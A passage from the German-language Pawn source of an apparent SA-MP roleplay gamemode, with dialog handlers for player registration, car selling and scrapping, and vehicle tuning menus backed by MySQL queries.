    	printf("%s",updatestring);
    	format(updatestring,sizeof updatestring,"Name='%s'",PlayerName(playerid));
    	mysqlget("login",updatestring,"ID",salt);
    	SpielerInfo[playerid][uID] = strval(salt);
		format(updatestring,sizeof updatestring,"INSERT INTO user (userID) VALUES ('%d')",strval(salt));
 		mysql_query(dbhandle, updatestring);
 		printf("%s",updatestring);
  		format(updatestring,sizeof updatestring,"INSERT INTO waffen (Name) VALUES ('%s')",PlayerName(playerid));
   		mysql_query(dbhandle, updatestring);
   		printf("%s",updatestring);
   		for(new x = 0; x < 2; x++) SAuto[playerid][x][sID] = -1;
   		SpielerInfo[playerid][uHausschluessel] = -1;
   		SpielerInfo[playerid][uGeschaeftschluessel] = -1;
   		for(new x = 0; x < sizeof(RegisterDraw); x++) TextDrawHideForPlayer(playerid,RegisterDraw[x]);
		SpielerInfo[playerid][uZiviSkin] = 3;
		SpielerInfo[playerid][uZiviFrak] = 0;
		TextDrawShowForPlayer(playerid, Hunger_box);
		TextDrawShowForPlayer(playerid, Hunger_box2);
		PlayerTextDrawShow(playerid, Hungeranzeige[playerid]);
		CancelSelectTextDraw(playerid);
		SpielerInfo[playerid][uAdmin] = 0;
		SpielerInfo[playerid][uLeiter] = 0;
		SpielerInfo[playerid][uMitglied] = 0;
		CDrogen[playerid][drogenid] = -1;
		CDrogen[playerid][drogenzeit] = 0;
		CDrogen[playerid][dX] = 0;
		CDrogen[playerid][dY] = 0;
		CDrogen[playerid][dZ] = 0;
		ladgangicon(playerid);
		SpielerInfo[playerid][uPayDaySekunden] = 0;
		TextDrawShowForPlayer(playerid,GeldAnzeige[0]);
		TextDrawShowForPlayer(playerid,GeldAnzeige[1]);
		TextDrawShowForPlayer(playerid,GeldAnzeige[2]);
		PlayerTextDrawShow(playerid,GeldAnzeigewert[playerid]);
		for(new x = 0; x < sizeof(SpielerInventar[]); x++)
		{
		    SpielerInventar[playerid][x][0] = -1;
		    SpielerInventar[playerid][x][1] = 0;
		}
		//Streamer_ToggleIdleUpdate(playerid, false);
		ShowPlayerDialog(playerid,DIALOG_GESCHLECHT,DIALOG_STYLE_MSGBOX,"Persönliche Informationen","Wähle dein Geschlecht:","{0091FF}Männlich","{FF62DE}Weiblich");
		new LVZONE = GangZoneCreate(6289.1978,6519.1387, 1861.9645, -9088.1201);//LV STADT
		GangZoneShowForPlayer(playerid, LVZONE, 0x5A5A5AFF);
	}

	else if(dialogid == DIALOG_AUTO1)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
				if(SAuto[playerid][0][sID] == -1) return SendClientMessage(playerid,COLOR_RED,"Du besitzt auf diesem Slot kein Fahrzeug!");
	            idein[playerid] = 0;
	            ShowPlayerDialog(playerid,DIALOG_AUTO2,DIALOG_STYLE_LIST,"Auto verwalten","Fahrzeugstatus\nFahrzeug verkaufen\nFahrzeug verschrotten\nFahrzeug suchen","Anwenden","Abbrechen");
	        }
			if(listitem == 1)
			{
			    if(SAuto[playerid][1][sID] == -1) return SendClientMessage(playerid,COLOR_RED,"Du besitzt auf diesem Slot kein Fahrzeug!");
			    idein[playerid] = 1;
			    ShowPlayerDialog(playerid,DIALOG_AUTO2,DIALOG_STYLE_LIST,"Auto verwalten","Fahrzeugstatus\nFahrzeug verkaufen\nFahrzeug verschrotten\nFahrzeug suchen","Anwenden","Abbrechen");
			}
	    }
	}
	else if(dialogid == DIALOG_AUTO2)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
			    if(idein[playerid] == 0)
			    {
			        if(SAuto[playerid][0][abgeschleppt] == 0)
   					{
			            SendClientMessage(playerid,COLOR_GREEN,"Fahrzeug nicht gesperrt!");
			        }else
					{
						new Float:xx,Float:yy,Float:zz;
						GetVehiclePos(SAuto[playerid][0][sID],xx,yy,zz);
						SetPlayerCheckpoint(playerid,xx,yy,zz-1,3.0);
						SendClientMessage(playerid,COLOR_RED,"Fahrzeug gesperrt! Befindet sich am Checkpoint!");
						cpaktiv[playerid] = 1;
					}
			    }
			    else
			    {
			        if(SAuto[playerid][1][abgeschleppt] == 0)
			        {
			            SendClientMessage(playerid,COLOR_GREEN,"Fahrzeug nicht gesperrt!");
			        }else{
						new Float:xx,Float:yy,Float:zz;
						GetVehiclePos(SAuto[playerid][1][sID],xx,yy,zz);
						SetPlayerCheckpoint(playerid,xx,yy,zz-1,3.0);
						SendClientMessage(playerid,COLOR_RED,"Fahrzeug gesperrt! Befindet sich am Checkpoint!");
						cpaktiv[playerid] = 1;
					}
			    }
			}
	        if(listitem == 1)
	        {
	            if(SAuto[playerid][idein[playerid]][sID] == -2)
	            {
	                SendClientMessage(playerid,COLOR_RED,"Das Fahrzeug ist kaputt! So kannst du es nicht verkaufen!");
	            }
	            else
	            {
	            	format(string,sizeof(string),"An welchen Spieler möchtest du dein %s verkaufen?",AutoDaten[GetVehicleModel(SAuto[playerid][idein[playerid]][sID])-399][AutoName]);
	            	ShowPlayerDialog(playerid,DIALOG_AUTO3,DIALOG_STYLE_INPUT,"Auto verkaufen",string,"Anwenden","Abbrechen");
	            }
	        }
			if(listitem == 2)
			{
			    if(IsPlayerInRangeOfPoint(playerid,15,6538.4653,-7747.4844,4.4076))
			    {
				    format(string,sizeof(string),"Möchtest du deinen %s wirklich für 260$ verschrotten?",AutoDaten[GetVehicleModel(SAuto[playerid][idein[playerid]][sID])-399][AutoName]);
		            ShowPlayerDialog(playerid,DIALOG_AUTO6,DIALOG_STYLE_MSGBOX,"Auto verschrotten",string,"Ja","Nein");
				}else{SendClientMessage(playerid,COLOR_RED,"Du bist nicht am Schrottplatz in Santa Felton!");}
			}
			if(listitem == 3)
			{
			    if(idein[playerid] == 0)
			    {
			        if(SAuto[playerid][0][sID] == -2)
					{
					    SendClientMessage(playerid,COLOR_GREEN,"Dein Fahrzeug ist kaputt! Du musst es zuerst reparieren!");
					}
					else
					{
						new Float:xx,Float:yy,Float:zz;
						GetVehiclePos(SAuto[playerid][0][sID],xx,yy,zz);
						SetPlayerCheckpoint(playerid,xx,yy,zz,3);
						SendClientMessage(playerid,COLOR_GREEN,"Dein Fahrzeug wurde gefunden! ( Checkpoint )");
						cpaktiv[playerid] = 1;
					}
			    }
			    else
			    {
       				if(SAuto[playerid][1][sID] == -2)
					{
					    SendClientMessage(playerid,COLOR_GREEN,"Dein Fahrzeug ist kaputt! Du musst es zuerst reparieren!");
					}
					else
					{
						new Float:xx,Float:yy,Float:zz;
						GetVehiclePos(SAuto[playerid][1][sID],xx,yy,zz);
						SetPlayerCheckpoint(playerid,xx,yy,zz,3);
						SendClientMessage(playerid,COLOR_GREEN,"Dein Fahrzeug wurde gefunden! ( Checkpoint )");
						cpaktiv[playerid] = 1;
					}
			    }
			}
	    }
	}
	else if(dialogid == DIALOG_AUTO6)
	{
	    if(response)
	    {
	        SendClientMessage(playerid,COLOR_RED,"Du hast dein Fahrzeug zum verschrotten hergegeben.");
			DestroyVehicle(SAuto[playerid][idein[playerid]][sID]);
			SAuto[playerid][idein[playerid]][sID] = -1;
			GebeGeld(playerid,-260);
			BizInfo[9][bkasse] += 260.1; Geschaftspeichern(9);
			format(string,sizeof string,"DELETE FROM autotuning WHERE sID='%d' AND Slot='%d'",SpielerInfo[playerid][uID],idein[playerid]);
			mysql_query(dbhandle, string);
			format(string,sizeof string,"DELETE FROM cars WHERE `ID`='%d' AND `Nummer`='%d'",SpielerInfo[playerid][uID],idein[playerid]);
			mysql_query(dbhandle, string);
			printf("%s",string);

	    }else{SendClientMessage(playerid,COLOR_RED,"Verschrottung abgebrochen!");}
	}
	else if(dialogid == DIALOG_AUTO3)
	{
	    if(response)
	    {
	        if(IsPlayerConnected(strval(inputtext)))
	        {
	            new ein = strval(inputtext);
	            if(SAuto[ein][0][sID] != -1 && SAuto[ein][1][sID] != -1){ SendClientMessage(playerid,COLOR_RED,"Dieser Spieler hat bereits zwei Fahrzeuge!");return 1; }
	        	else if(SAuto[ein][0][sID] == -1)  {autokey[ein] = 0;}
	        	else{autokey[ein] = 1;}
				autovid[playerid] = ein;
				autovid[ein] = playerid;
	        	ShowPlayerDialog(playerid,DIALOG_AUTO4,DIALOG_STYLE_INPUT,"Auto verkaufen","Für wie viel möchtest du dein Auto verkaufen?","Anbieten","Abbrechen");
	        }else{SendClientMessage(playerid,COLOR_RED,"Diesen Spieler gibt es nicht!");}

	    }else{SendClientMessage(playerid,COLOR_RED,"Verkauf abgebrochen.");}
	}
	else if(dialogid == DIALOG_AUTO4)
	{
	    if(response)
	    {
     		new Float:ein = floatstr(inputtext);
     		if(ein > 0.00)
     		{
     		    new str[200],name[MAX_PLAYER_NAME];
     		    GetPlayerName(autovid[playerid],name,sizeof(name));
				format(str,sizeof(str),"Du hast %s dein Fahrzeug für %.2f$ angeboten. Warte bis er es annimmt.",name,ein);
				SendClientMessage(playerid,COLOR_GREEN,str);
				autopreis[autovid[playerid]] = ein;
				autopreis[playerid] = ein;
				GetPlayerName(playerid,name,sizeof(name));
				format(str,sizeof(str),"Willst du das Auto %s von %s für %.2f$ kaufen?",AutoDaten[GetVehicleModel(SAuto[playerid][idein[playerid]][sID])-399][AutoName],name,ein);
				ShowPlayerDialog(autovid[playerid],DIALOG_AUTO5,DIALOG_STYLE_MSGBOX,"Auto verkaufen",str,"Kaufen","Abbrechen");
     		}else{SendClientMessage(playerid,COLOR_RED,"Du musst das Fahrzeug mindestens für 0.01$ verkaufen."); autovid[playerid] = -1; autovid[autovid[playerid]] = -1; autokey[autovid[playerid]] = -1;}

	    }
	}
	else if(dialogid == DIALOG_TUNING9)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
				ShowPlayerDialog(playerid,DIALOG_TUNING10,DIALOG_STYLE_LIST,"Tuning","Slamin\nWheelcover","Inportieren","Zurück");
			}
			if(listitem == 1)
	        {
				ShowPlayerDialog(playerid,DIALOG_TUNING11,DIALOG_STYLE_LIST,"Tuning","Slamin\nChrome","Inportieren","Zurück");
			}
			if(listitem == 2)
	        {
				ShowPlayerDialog(playerid,DIALOG_TUNING12,DIALOG_STYLE_LIST,"Tuning","Hardtop\nSofttop","Inportieren","Zurück");
			}
			if(listitem == 3)
	        {
				ShowPlayerDialog(playerid,DIALOG_TUNING13,DIALOG_STYLE_LIST,"Tuning","Slamin\nChrome","Inportieren","Zurück");
			}
			if(listitem == 4)
	        {
				ShowPlayerDialog(playerid,DIALOG_TUNING14,DIALOG_STYLE_LIST,"Tuning","Slamin\nChrome","Inportieren","Zurück");
			}
			if(listitem == 5)
	        {
				SendClientMessage(playerid,COLOR_RED,"Für dieses Fahrzeug sind Paintjobs noch nicht importiert!"); ZeigeTuningan(playerid);
			}
		}
		else
		{
            ShowPlayerDialog(playerid,DIALOG_PNS,DIALOG_STYLE_LIST,"Was möchtest du machen?","Fahrzeugreperatur\nUmspritzung -250$\nNitro\nHydraulik -140$\nReifen -120$\nSonstiges Tuning je Bauteil 90$","Weiter","Verlassen");
		}
	}
	else if(dialogid == DIALOG_TUNING14)
	{
		if(response)
		{
		    new vehicle = GetPlayerVehicleID(playerid);
		    new veh = GetPlayerVehicleID(playerid);
		    if(listitem == 0)
		    {
		        if(GetVehicleModel(vehicle) == 575){AddVehicleComponent(veh,1177); GebeGeld(playerid,TUNINGKOSTEN); ZeigeTuningan(playerid);}
				else if (GetVehicleModel(vehicle) == 567){AddVehicleComponent(veh,1186); GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
				else if (GetVehicleModel(vehicle) == 536){AddVehicleComponent(veh,1183);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
				else if (GetVehicleModel(vehicle) == 535){AddVehicleComponent(veh,1110); GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
				else if (GetVehicleModel(vehicle) == 576){AddVehicleComponent(veh,1193); GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
				else{SendClientMessage(playerid,COLOR_RED,"Für dein Fahrzeug gibt es dieses Bauteil nicht!"); ZeigeTuningan(playerid);}
				if(mussspeichern[playerid] > 0){Tuningspeichern(playerid,welcherslot[playerid]);}
		    }
		    if(listitem == 1)
		    {
		        if(GetVehicleModel(vehicle) == 575){AddVehicleComponent(veh,1176); GebeGeld(playerid,TUNINGKOSTEN); ZeigeTuningan(playerid);}
				else if (GetVehicleModel(vehicle) == 567){AddVehicleComponent(veh,1187); GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
				else if (GetVehicleModel(vehicle) == 536){AddVehicleComponent(veh,1184);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
				else if (GetVehicleModel(vehicle) == 535){AddVehicleComponent(veh,1109); GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
				else if (GetVehicleModel(vehicle) == 576){AddVehicleComponent(veh,1192); GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
				else{SendClientMessage(playerid,COLOR_RED,"Für dein Fahrzeug gibt es dieses Bauteil nicht!"); ZeigeTuningan(playerid);}
				if(mussspeichern[playerid] > 0){Tuningspeichern(playerid,welcherslot[playerid]);}
			}
		}
		else
		{
		    ZeigeTuning(playerid);
		}
	}
	else if(dialogid == DIALOG_TUNING13)
	{
		if(response)
		{
		    new vehicle = GetPlayerVehicleID(playerid);
		    new veh = GetPlayerVehicleID(playerid);
		    if(listitem == 0)
		    {
		        if(GetVehicleModel(vehicle) == 575){AddVehicleComponent(veh,1175); GebeGeld(playerid,TUNINGKOSTEN); ZeigeTuningan(playerid);}
				else if (GetVehicleModel(vehicle) == 567){AddVehicleComponent(veh,1188); GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
				else if (GetVehicleModel(vehicle) == 536){AddVehicleComponent(veh,1181);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
				else if (GetVehicleModel(vehicle) == 535){AddVehicleComponent(veh,1116); GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
				else if (GetVehicleModel(vehicle) == 576){AddVehicleComponent(veh,1190); GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
				else{SendClientMessage(playerid,COLOR_RED,"Für dein Fahrzeug gibt es dieses Bauteil nicht!"); ZeigeTuningan(playerid);}
				if(mussspeichern[playerid] > 0){Tuningspeichern(playerid,welcherslot[playerid]);}
		    }
		    if(listitem == 1)
		    {
		        if(GetVehicleModel(vehicle) == 575){AddVehicleComponent(veh,1174); GebeGeld(playerid,TUNINGKOSTEN); ZeigeTuningan(playerid);}
				else if (GetVehicleModel(vehicle) == 567){AddVehicleComponent(veh,1189); GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
				else if (GetVehicleModel(vehicle) == 536){AddVehicleComponent(veh,1182);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
				else if (GetVehicleModel(vehicle) == 535){AddVehicleComponent(veh,1117); GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
				else if (GetVehicleModel(vehicle) == 576){AddVehicleComponent(veh,1191); GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
				else{SendClientMessage(playerid,COLOR_RED,"Für dein Fahrzeug gibt es dieses Bauteil nicht!"); ZeigeTuningan(playerid);}
				if(mussspeichern[playerid] > 0){Tuningspeichern(playerid,welcherslot[playerid]);}
			}
		}
		else
		{
		    ZeigeTuning(playerid);
		}
	}
	else if(dialogid == DIALOG_TUNING12)
	{
		if(response)
		{
		    new vehicle = GetPlayerVehicleID(playerid);
		    new veh = GetPlayerVehicleID(playerid);
		    if(listitem == 0)
		    {
				if (GetVehicleModel(vehicle) == 567){AddVehicleComponent(veh,1130); GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
				else if (GetVehicleModel(vehicle) == 536){AddVehicleComponent(veh,1128);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
				else{SendClientMessage(playerid,COLOR_RED,"Für dein Fahrzeug gibt es dieses Bauteil nicht!"); ZeigeTuningan(playerid);}
				if(mussspeichern[playerid] > 0){Tuningspeichern(playerid,welcherslot[playerid]);}
		    }
		    if(listitem == 1)
		    {
				if (GetVehicleModel(vehicle) == 567){AddVehicleComponent(veh,1131); GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
				else if (GetVehicleModel(vehicle) == 536){AddVehicleComponent(veh,1103);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
				else{SendClientMessage(playerid,COLOR_RED,"Für dein Fahrzeug gibt es dieses Bauteil nicht!"); ZeigeTuningan(playerid);}
				if(mussspeichern[playerid] > 0){Tuningspeichern(playerid,welcherslot[playerid]);}
			}
		}
		else
		{
		    ZeigeTuning(playerid);
		}
	}
	else if(dialogid == DIALOG_TUNING11)
	{
		if(response)
		{
		    new vehicle = GetPlayerVehicleID(playerid);
		    new veh = GetPlayerVehicleID(playerid);
		    if(listitem == 0)
		    {
		        if(GetVehicleModel(vehicle) == 575){AddVehicleComponent(veh,1043); GebeGeld(playerid,TUNINGKOSTEN); ZeigeTuningan(playerid);}
				else if (GetVehicleModel(vehicle) == 567){AddVehicleComponent(veh,1132); GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
				else if (GetVehicleModel(vehicle) == 536){AddVehicleComponent(veh,1105);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
				else if (GetVehicleModel(vehicle) == 535){AddVehicleComponent(veh,1114); GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
				else if (GetVehicleModel(vehicle) == 576){AddVehicleComponent(veh,1135); GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
				else{SendClientMessage(playerid,COLOR_RED,"Für dein Fahrzeug gibt es dieses Bauteil nicht!"); ZeigeTuningan(playerid);}
				if(mussspeichern[playerid] > 0){Tuningspeichern(playerid,welcherslot[playerid]);}
		    }
		    if(listitem == 1)
		    {
		        if(GetVehicleModel(vehicle) == 575){AddVehicleComponent(veh,1044); GebeGeld(playerid,TUNINGKOSTEN); ZeigeTuningan(playerid);}
				else if (GetVehicleModel(vehicle) == 567){AddVehicleComponent(veh,1129); GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
				else if (GetVehicleModel(vehicle) == 536){AddVehicleComponent(veh,1104);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
				else if (GetVehicleModel(vehicle) == 535){AddVehicleComponent(veh,1113); GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
				else if (GetVehicleModel(vehicle) == 576){AddVehicleComponent(veh,1136); GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
				else{SendClientMessage(playerid,COLOR_RED,"Für dein Fahrzeug gibt es dieses Bauteil nicht!"); ZeigeTuningan(playerid);}
				if(mussspeichern[playerid] > 0){Tuningspeichern(playerid,welcherslot[playerid]);}
			}
		}
		else
		{
		    ZeigeTuning(playerid);
		}
	}
	else if(dialogid == DIALOG_TUNING10)
	{
		if(response)
		{
		    new vehicle = GetPlayerVehicleID(playerid);
		    new veh = GetPlayerVehicleID(playerid);
		    if(listitem == 0)
		    {
				if (GetVehicleModel(vehicle) == 535){AddVehicleComponent(veh,1121); AddVehicleComponent(veh,1119);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
				else{SendClientMessage(playerid,COLOR_RED,"Für dein Fahrzeug gibt es dieses Bauteil nicht!"); ZeigeTuningan(playerid);}
				if(mussspeichern[playerid] > 0){Tuningspeichern(playerid,welcherslot[playerid]);}
		    }
		    if(listitem == 1)
		    {
		        if(GetVehicleModel(vehicle) == 575){AddVehicleComponent(veh,1042); AddVehicleComponent(veh,1099);GebeGeld(playerid,TUNINGKOSTEN); ZeigeTuningan(playerid);}
				else if (GetVehicleModel(vehicle) == 567){AddVehicleComponent(veh,1133); AddVehicleComponent(veh,1102);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
				else if (GetVehicleModel(vehicle) == 536){AddVehicleComponent(veh,1107); AddVehicleComponent(veh,1108);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
				else if (GetVehicleModel(vehicle) == 535){AddVehicleComponent(veh,1118); AddVehicleComponent(veh,1120);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
				else if (GetVehicleModel(vehicle) == 576){AddVehicleComponent(veh,1134); AddVehicleComponent(veh,1137);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuningan(playerid);}
                else{SendClientMessage(playerid,COLOR_RED,"Für dein Fahrzeug gibt es dieses Bauteil nicht!"); ZeigeTuningan(playerid);}
                if(mussspeichern[playerid] > 0){Tuningspeichern(playerid,welcherslot[playerid]);}
			}
		}
		else
		{
		    ZeigeTuning(playerid);
		}
	}
	else if(dialogid == DIALOG_TUNING1)
	{
		if(response)
		{
		    if(listitem == 0)
		    {
		        ShowPlayerDialog(playerid,DIALOG_TUNING2,DIALOG_STYLE_LIST,"Tuning","Alien Sidekirt\nX-Flow Sidekirt","Importieren","Zurück");
		    }
		    if(listitem == 1)
		    {
                ShowPlayerDialog(playerid,DIALOG_TUNING3,DIALOG_STYLE_LIST,"Tuning","Alien Auspuff\nX-Flow Auspuff","Importieren","Zurück");
		    }
		    if(listitem == 2)
		    {
                ShowPlayerDialog(playerid,DIALOG_TUNING4,DIALOG_STYLE_LIST,"Tuning","Alien Spoiler\nX-Flow Spoiler","Importieren","Zurück");
		    }
		    if(listitem == 3)
		    {
                ShowPlayerDialog(playerid,DIALOG_TUNING5,DIALOG_STYLE_LIST,"Tuning","Alien Dach\nX-Flow Dach","Importieren","Zurück");
		    }
		    if(listitem == 4)
		    {
                ShowPlayerDialog(playerid,DIALOG_TUNING6,DIALOG_STYLE_LIST,"Tuning","Alien Vordere Stoßstange\nX-Flow Vordere Stoßstange","Importieren","Zurück");
		    }
		    if(listitem == 5)
		    {
                ShowPlayerDialog(playerid,DIALOG_TUNING7,DIALOG_STYLE_LIST,"Tuning","Alien Hintere Stoßstange\nX-Flow Hintere Stoßstange","Importieren","Zurück");
		    }
		    if(listitem == 6)
		    {
                ShowPlayerDialog(playerid,DIALOG_TUNING8,DIALOG_STYLE_LIST,"Tuning","Paintjob 1\nPaintjob 2\nPaintjob 3","Importieren","Zurück");
		    }
		}
		else
		{
		    ShowPlayerDialog(playerid,DIALOG_PNS,DIALOG_STYLE_LIST,"Was möchtest du machen?","Fahrzeugreperatur\nUmspritzung -250$\nNitro\nHydraulik -140$\nReifen -120$\nSonstiges Tuning je Bauteil 90$","Weiter","Verlassen");
		}
	}
	else if(dialogid == DIALOG_TUNING8)
	{
		if(response)
		{
		    new vehicle = GetPlayerVehicleID(playerid);
		    if(listitem == 0)
		    {
				ChangeVehiclePaintjob(vehicle, 0);
				GebeGeld(playerid,TUNINGKOSTEN);
				ZeigeTuning(playerid);
				if(mussspeichern[playerid] > 0){Paintjobspeichern(playerid,welcherslot[playerid],0);}
		    }
		    if(listitem == 1)
		    {
				ChangeVehiclePaintjob(vehicle, 1);
				GebeGeld(playerid,TUNINGKOSTEN);
				ZeigeTuning(playerid);
				if(mussspeichern[playerid] > 0){Paintjobspeichern(playerid,welcherslot[playerid],1);}
		    }
		    if(listitem == 2)
		    {
				ChangeVehiclePaintjob(vehicle, 2);
				GebeGeld(playerid,TUNINGKOSTEN);
				ZeigeTuning(playerid);
				if(mussspeichern[playerid] > 0){Paintjobspeichern(playerid,welcherslot[playerid],2);}
		    }
		}
		else
		{
		    ZeigeTuning(playerid);
		}
	}
	else if(dialogid == DIALOG_TUNING7)
	{
		if(response)
		{
		    new vehicle = GetPlayerVehicleID(playerid);
		    new veh = GetPlayerVehicleID(playerid);
		    if(listitem == 0)
		    {
		        if(GetVehicleModel(vehicle) == 560){AddVehicleComponent(veh,1141);GebeGeld(playerid,TUNINGKOSTEN); ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 562){AddVehicleComponent(veh,1149);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 565){AddVehicleComponent(veh,1150);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 561){AddVehicleComponent(veh,1154);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 559){AddVehicleComponent(veh,1159);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 558){AddVehicleComponent(veh,1168);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				if(mussspeichern[playerid] > 0){Tuningspeichern(playerid,welcherslot[playerid]);}
		    }
		    if(listitem == 1)
		    {
		        if(GetVehicleModel(vehicle) == 560){AddVehicleComponent(veh,1140);GebeGeld(playerid,TUNINGKOSTEN); ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 562){AddVehicleComponent(veh,1148);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 565){AddVehicleComponent(veh,1151);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 561){AddVehicleComponent(veh,1156);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 559){AddVehicleComponent(veh,1161);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 558){AddVehicleComponent(veh,1167);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				if(mussspeichern[playerid] > 0){Tuningspeichern(playerid,welcherslot[playerid]);}
		    }
		}
		else
		{
		    ZeigeTuning(playerid);
		}
	}
	else if(dialogid == DIALOG_TUNING6)
	{
		if(response)
		{
		    new vehicle = GetPlayerVehicleID(playerid);
		    new veh = GetPlayerVehicleID(playerid);
		    if(listitem == 0)
		    {
		        if(GetVehicleModel(vehicle) == 560){AddVehicleComponent(veh,1169);GebeGeld(playerid,TUNINGKOSTEN); ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 562){AddVehicleComponent(veh,1171);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 565){AddVehicleComponent(veh,1153);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 561){AddVehicleComponent(veh,1155);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 559){AddVehicleComponent(veh,1160);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 558){AddVehicleComponent(veh,1166);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				if(mussspeichern[playerid] > 0){Tuningspeichern(playerid,welcherslot[playerid]);}
		    }
		    if(listitem == 1)
		    {
		        if(GetVehicleModel(vehicle) == 560){AddVehicleComponent(veh,1170);GebeGeld(playerid,TUNINGKOSTEN); ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 562){AddVehicleComponent(veh,1172);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 565){AddVehicleComponent(veh,1053);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 561){AddVehicleComponent(veh,1157);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 559){AddVehicleComponent(veh,1173);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 558){AddVehicleComponent(veh,1165);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				if(mussspeichern[playerid] > 0){Tuningspeichern(playerid,welcherslot[playerid]);}
		    }
		}
		else
		{
		    ZeigeTuning(playerid);
		}
	}
	else if(dialogid == DIALOG_TUNING5)
	{
		if(response)
		{
		    new vehicle = GetPlayerVehicleID(playerid);
		    new veh = GetPlayerVehicleID(playerid);
		    if(listitem == 0)
		    {
		        if(GetVehicleModel(vehicle) == 560){AddVehicleComponent(veh,1032);GebeGeld(playerid,TUNINGKOSTEN); ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 562){AddVehicleComponent(veh,1038);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 565){AddVehicleComponent(veh,1054);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 561){AddVehicleComponent(veh,1055);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 559){AddVehicleComponent(veh,1067);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 558){AddVehicleComponent(veh,1088);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				if(mussspeichern[playerid] > 0){Tuningspeichern(playerid,welcherslot[playerid]);}
		    }
		    if(listitem == 1)
		    {
		        if(GetVehicleModel(vehicle) == 560){AddVehicleComponent(veh,1033);GebeGeld(playerid,TUNINGKOSTEN); ZeigeTuning(playerid);}
